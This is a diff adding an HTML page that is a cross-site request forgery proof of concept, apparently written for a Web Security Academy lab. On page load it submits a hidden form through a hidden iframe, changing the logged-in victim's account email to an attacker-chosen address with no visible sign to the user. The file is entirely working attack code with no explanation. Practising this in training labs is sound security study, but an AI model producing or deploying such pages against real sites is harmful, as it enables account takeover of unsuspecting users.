@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <h1>Hello anonymus</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a6e00b703cb28f280092b71001300cb.web-security-academy.net/my-account?id=wiener/my-account/change-email"
+              method="post" target="csrf-iframe" id="csrf-form">
+              <input type="hidden" name="email" value="test5@test.ca">
+
+            </form>
+            <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
